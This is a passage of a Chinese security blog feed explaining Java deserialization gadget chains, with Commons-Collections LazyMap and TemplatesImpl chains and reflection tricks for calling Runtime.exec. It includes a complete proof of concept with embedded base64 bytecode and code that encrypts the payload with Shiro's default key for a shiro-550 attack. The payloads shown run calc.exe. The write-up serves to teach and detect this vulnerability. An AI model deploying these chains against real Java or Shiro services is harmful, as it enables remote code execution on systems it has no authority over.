class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; String.class,Class[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; <span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; Object.class,Object[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; <span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; String.class &#125;,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">String</span>[] &#123;<span class="string">&quot;calc.exe&quot;</span> &#125;),</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(fakeTransformers);<span class="comment">//先绑定假transform</span></span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap, transformerChain);</span><br><span class="line"></span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tme</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(outerMap, <span class="string">&quot;keykey&quot;</span>);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">expMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        expMap.put(tme, <span class="string">&quot;valuevalue&quot;</span>);</span><br><span class="line">        outerMap.remove(<span class="string">&quot;keykey&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> ChainedTransformer.class.getDeclaredField(<span class="string">&quot;iTransformers&quot;</span>);</span><br><span class="line">        f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        f.set(transformerChain, transformers);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">barr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(barr);</span><br><span class="line">        oos.writeObject(expMap);</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span></span><br><span class="line">                <span class="title class_">ByteArrayInputStream</span>(barr.toByteArray()));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> (Object)ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到依旧用了Transformer[]数组，因为需要用到chainedTransformer。为了舍弃chainedTransformer就必须舍弃ConstantTransformer(初始化恶意对象)和InvokerTransformer的其中一个。</p><p>为了触发TiedMapEntry#hashcode()，在实例化TiedMapEntry时传入了LazyMap对象。在构造TiedMapEntry时，第二个参数都是随便填的（无论value是否为”keykey”都会使<code>map.containsKey(key)==ture</code>，只要有值)</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">TiedMapEntry</span> <span class="variable">tme</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(outerMap, <span class="string">&quot;keykey&quot;</span>);</span><br></pre></td></tr></table></figure><p><code>LazyMap#get()</code>时会把key传到transformer[]-&gt;InvokerTransformer-&gt;transform()</p><p>所以在创建tme时，把key的值改为TemplatesImpl恶意对象就行了</p><p>POC:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonsCollectionsShiro</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">byte</span>[] getPayload(<span class="type">byte</span>[] clazzBytes) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] code =Base64.getDecoder().decode(<span class="string">&quot;yv66vgAAADQAOgoACQAhCQAiACMIACQKACUAJgoAJwAoCAApCgAnACoHACsHACwBAAl0cmFuc2Zvcm0BAHIoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007W0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAGExldmlsL0V2aWxUZW1wbGF0ZXNJbXBsOwEACGRvY3VtZW50AQAtTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007AQAIaGFuZGxlcnMBAEJbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAApFeGNlcHRpb25zBwAtAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGl0ZXJhdG9yAQA1TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjsBAAdoYW5kbGVyAQBBTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAAY8aW5pdD4BAAMoKVYHAC4BAApTb3VyY2VGaWxlAQAWRXZpbFRlbXBsYXRlc0ltcGwuamF2YQwAHAAdBwAvDAAwADEBABNIZWxsbyBUZW1wbGF0ZXNJbXBsBwAyDAAzADQHADUMADYANwEACGNhbGMuZXhlDAA4ADkBABZldmlsL0V2aWxUZW1wbGF0ZXNJbXBsAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAE2phdmEvbGFuZy9FeGNlcHRpb24BABBqYXZhL2xhbmcvU3lzdGVtAQADb3V0AQAVTGphdmEvaW8vUHJpbnRTdHJlYW07AQATamF2YS9pby9QcmludFN0cmVhbQEAB3ByaW50bG4BABUoTGphdmEvbGFuZy9TdHJpbmc7KVYBABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7ACEACAAJAAAAAAADAAEACgALAAIADAAAAD8AAAADAAAAAbEAAAACAA0AAAAGAAEAAAAKAA4AAAAgAAMAAAABAA8AEAAAAAAAAQARABIAAQAAAAEAEwAUAAIAFQAAAAQAAQAWAAEACgAXAAIADAAAAEkAAAAEAAAAAbEAAAACAA0AAAAGAAEAAAAMAA4AAAAqAAQAAAABAA8AEAAAAAAAAQARABIAAQAAAAEAGAAZAAIAAAABABoAGwADABUAAAAEAAEAFgABABwAHQACAAwAAABMAAIAAQAAABYqtwABsgACEgO2AAS4AAUSBrYAB1exAAAAAgANAAAAEgAEAAAADwAEABAADAARABUAEgAOAAAADAABAAAAFgAPABAAAAAVAAAABAABAB4AAQAfAAAAAgAg&quot;</span>);</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;code&#125;);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;godown&quot;</span>);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getClass&quot;</span>, <span class="literal">null</span>, <span class="literal">null</span>);<span class="comment">//避免调试中多次调用LazyMap，随便先放个类</span></span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap, transformer);</span><br><span class="line"></span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tme</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(outerMap, obj);</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">expMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        expMap.put(tme, <span class="string">&quot;valuevalue&quot;</span>);</span><br><span class="line"></span><br><span class="line">        outerMap.clear();<span class="comment">//作用等同outerMap.remove()</span></span><br><span class="line">        setFieldValue(transformer, <span class="string">&quot;iMethodName&quot;</span>, <span class="string">&quot;newTransformer&quot;</span>);<span class="comment">//替换为反序列化链入口</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// ==================</span></span><br><span class="line">        <span class="comment">// 生成序列化字符串</span></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">barr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(barr);</span><br><span class="line">        oos.writeObject(expMap);</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> barr.toByteArray();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>用到Clientattack类把上面的payload用密钥进行加密。</p><p>javassist库加载TemplatesImpl编译的字节码，然后base64解密的密钥进行aes加密</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.crypto.AesCipherService;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.util.ByteSource;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Clientattack</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String []args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">clazz</span> <span class="operator">=</span></span><br><span class="line">                pool.get(org.example.CommonsCollectionsShiro.class.getName());</span><br><span class="line">        <span class="type">byte</span>[] payloads = <span class="keyword">new</span></span><br><span class="line">                <span class="title class_">CommonsCollectionsShiro</span>().getPayload(clazz.toBytecode());</span><br><span class="line">        <span class="type">AesCipherService</span> <span class="variable">aes</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AesCipherService</span>();</span><br><span class="line">        <span class="type">byte</span>[] key =</span><br><span class="line">                java.util.Base64.getDecoder().decode(<span class="string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span>);</span><br><span class="line">        <span class="type">ByteSource</span> <span class="variable">ciphertext</span> <span class="operator">=</span> aes.encrypt(payloads, key);</span><br><span class="line">        System.out.printf(ciphertext.toString());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>需要用到javassist库，下载到本地项目结构里直接添加</p><p><code>https://www.javassist.org/</code></p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221204181850284.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221204181850284.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20221204181850284"></p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221204181959799.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221204181959799.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20221204181959799"></p><p>这个反序列化链可以用来检测shiro-550</p>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
          <category> CC </category>
          
      </categories>
      
      
        <tags>
            
            <tag> shiro </tag>
            
            <tag> BCEL </tag>
            
            <tag> defineClass </tag>
            
            <tag> CC3 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java TransformedMap&amp;LazyMap</title>
      <link href="/2022/09/03/java-transformedmap-lazymap/"/>
      <url>/2022/09/03/java-transformedmap-lazymap/</url>
      
        <content type="html"><![CDATA[<h1 id="java反射"><a href="#java反射" class="headerlink" title="java反射"></a>java反射</h1><p>首先，反射通常是通过class方法生成的class对象，所以可以使用比如runtime下没有而class下有的方法。比如序列化，runtime是生成对象是无法序列化的，但是class可以。所以一般都要通过class进行反序列化</p><h2 id="getMethod利用实例化对象方法实例化对象"><a href="#getMethod利用实例化对象方法实例化对象" class="headerlink" title="getMethod利用实例化对象方法实例化对象"></a>getMethod利用实例化对象方法实例化对象</h2><ul><li>方法.invoke(对象，参数)调用该对象下的方法</li></ul><p>Runtime下的构造函数是私有的，只能通过Runtime.getRuntime()来获取Runtime对象。</p><ul><li>getMethod通过反射获取一个类的公有方法（因为重载的存在不能直接确定函数）。而invoke和getMethod的区别就是invoke会执行函数。</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line"><span class="type">Method</span> <span class="variable">execMethod</span> <span class="operator">=</span> clazz.getMethod(<span class="string">&quot;exec&quot;</span>, String.class);</span><br><span class="line"><span class="type">Method</span> <span class="variable">getRuntimeMethod</span> <span class="operator">=</span> clazz.getMethod(<span class="string">&quot;getRuntime&quot;</span>);</span><br><span class="line"><span class="type">Object</span> <span class="variable">runtime</span> <span class="operator">=</span> getRuntimeMethod.invoke(clazz);</span><br><span class="line">execMethod.invoke(runtime, <span class="string">&quot;calc.exe&quot;</span>);</span><br></pre></td></tr></table></figure><p>所以上述代码就是，用forName获取Runtime类并命名为clazz，用getMethod获取clazz类里的exec方法(因为exec有6个重载的原因要加string.class参数)并命名为execMethod，用getMethod获取getRuntime方法并命名为getRuntimeMethod，用getRuntimeMethod方法获取Runtime的对象，invoke执行clazz类下的getRuntimeMethod方法（也就是生成对象）并命名为runtime。最好invoke执行runtime对象的exec方法，并传入参数calc.exe。也就是打开计算器。</p><h2 id="getConstructor利用构造函数实例化对象"><a href="#getConstructor利用构造函数实例化对象" class="headerlink" title="getConstructor利用构造函数实例化对象"></a>getConstructor利用构造函数实例化对象</h2><p>该方法实例化需要构造函数公有</p><ul><li><p>newInstance实例化类对象</p></li><li><p>getConstructor获取<strong>具有指定参数类型的指定类构造函数</strong>。</p></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>);</span><br><span class="line">clazz.getMethod(<span class="string">&quot;start&quot;</span>).invoke(clazz.getConstructor(List.class).newInstance(Arrays.asList(<span class="string">&quot;calc.exe&quot;</span>)));</span><br></pre></td></tr></table></figure><p>forName获取ProcessBuilder类，用getMethod获取start方法。</p><p>但是ProcessBuilder的构造函数参数有<code>List&lt;string&gt;</code>或者<code>string...</code>。</p><p><code>...</code>表示不确定参数个数，在底层为一个数组，所以可以直接传数组参数</p><ul><li>如果要获取<code>List&lt;string&gt;</code>参数的构造函数，可以用List强制类型转化后传参</li></ul><p>invoke调用getConstructor获取构造函数，然后用newInstance实例化类对象时就会调用构造函数。newInstance的参数calc.exe会作为参数传递给构造函数，然后start共享参数执行命令。即<code>clazz.getConstructor(List.class).newInstance(Arrays.asList(&quot;calc.exe&quot;))</code>是向构造函数传calc.exe参实例化对象</p><ul><li>如果要执行<code>string...</code>格式的构造函数，就是要传<code>String[].class</code></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>);</span><br><span class="line">clazz.getMethod(<span class="string">&quot;start&quot;</span>).invoke(clazz.getConstructor(String[].class).newInstance(<span class="keyword">new</span> <span class="title class_">String</span>[][]&#123;&#123;<span class="string">&quot;calc.exe&quot;</span>&#125;&#125;));</span><br></pre></td></tr></table></figure><p>因为newInstance也是接收变长参数，getConstructor也是接收变长参数，所以要传二维数组</p><p>那构造函数私有呢？</p><h2 id="getDeclaredMethod或getDeclaredConstruct获取私有构造函数实例化对象"><a href="#getDeclaredMethod或getDeclaredConstruct获取私有构造函数实例化对象" class="headerlink" title="getDeclaredMethod或getDeclaredConstruct获取私有构造函数实例化对象"></a>getDeclaredMethod或getDeclaredConstruct获取私有构造函数实例化对象</h2><p>上面两种方法由于<code>getMethod</code>和<code>getConstruct</code>是获取类的所有<strong>公共</strong>方法，包括继承。所以不能获取到私有和保护方法。但是<code>getDeclaredMethod</code>和<code>getDeclaredConstruct</code>是获取声明（写）在类的方法，就能<strong>获取到私有和保护方法</strong>，但是不能获取继承方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line"><span class="type">Constructor</span> <span class="variable">m</span> <span class="operator">=</span> clazz.getDeclaredConstructor();</span><br><span class="line">m.setAccessible(<span class="literal">true</span>);</span><br><span class="line">clazz.getMethod(<span class="string">&quot;exec&quot;</span>, String.class).invoke(m.newInstance(), <span class="string">&quot;calc.exe&quot;</span>)</span><br></pre></td></tr></table></figure><p>必须写setAccessible修改作用域。因为Runtime有无参构造函数的原因，getDeclaredConstructor可以不加参数。不像ProcessBuilder有两个构造函数而且都有参数</p><h1 id="JAVA-RMI"><a href="#JAVA-RMI" class="headerlink" title="JAVA RMI"></a>JAVA RMI</h1><p>RMI为远程方法调用.过程有三方参与，分别为Registry,Server,Client。如果学过可信计算，可以把Registry理解为可信第三方</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">Naming.bind(<span class="string">&quot;rmi://127.0.0.1:1099/Hello&quot;</span>, <span class="keyword">new</span> <span class="title class_">RemoteHelloWorld</span>());</span><br></pre></td></tr></table></figure><p>创建Registry并绑定RemoteHelloworld对象到Hello名字上。Naming.bind第一个参数是url（rmi:&#x2F;&#x2F;host:port&#x2F;name)，name为远程对象的名字。本地运行时socket默认为localhost:1099。 </p><p>而在远程用Naming.rebind重新绑定对象是不行的，只有url ip为localhost才能直接调用rebind\bind等方法。（ip必须为服务器ip才能远程访问）</p><ul><li>list搭配lookup进行远程调用。List列出所有绑定对象后用lookup获取指定对象(BaRMIe探测危险方法)</li><li>applet的codebase标签RMI</li></ul><h1 id="JAVA反序列化"><a href="#JAVA反序列化" class="headerlink" title="JAVA反序列化"></a>JAVA反序列化</h1><p><code>readObject</code>：和<code>php __wakeup</code>类似</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.vulhub.Ser;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span> <span class="keyword">implements</span> <span class="title class_">java</span>.io.Serializable &#123;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> age;</span><br><span class="line">    Person(String name, <span class="type">int</span> age) &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">writeObject</span><span class="params">(java.io.ObjectOutputStream s)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        s.defaultWriteObject();</span><br><span class="line">        s.writeObject(<span class="string">&quot;This is a object&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream s)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        s.defaultReadObject();</span><br><span class="line">        <span class="type">String</span> <span class="variable">message</span> <span class="operator">=</span> (String) s.readObject();</span><br><span class="line">        System.out.println(message);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>序列化对象时会调用writeObject方法写入内容，参数类型为ObjectOutputStream。反序列化时会调用readObject读取流，该流可以进行利用以读取前面写入的内容（也可以其他利用）</p><p>defaultWriteObject将对象可序列化字段写入输出流，也就是序列化。</p><p>s.writeObject把字符串写入流中。read同理</p><p>在代码进行到中间，也就是writeObject完的时候用SerializationDumper查看数据时发现写入的字符串放在<code>objectAnnotation</code>的位置</p><ul><li>objectAnnotation:序列化时开发者写入的内容会放在objectAnnotation中。readObject反序列时会读取写入内容（不用考虑类属性，任意东西都能写入）</li></ul><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221110210950116.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221110210950116.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20221110210950116"></p><p>readObject读取写入内容后传入message，printIn输出</p><p>在URLDNS利用链里用到了hashmap，主要原因就是hashmap继承了Serializable接口</p><h2 id="Common-collections1-TransformMap版"><a href="#Common-collections1-TransformMap版" class="headerlink" title="Common-collections1 TransformMap版"></a>Common-collections1 TransformMap版</h2><p>下面对p神编写的简化版commoncollections1的利用链</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.vulhub.Ser;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonCollections1</span> &#123;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line"><span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.getRuntime()),</span><br><span class="line"><span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span 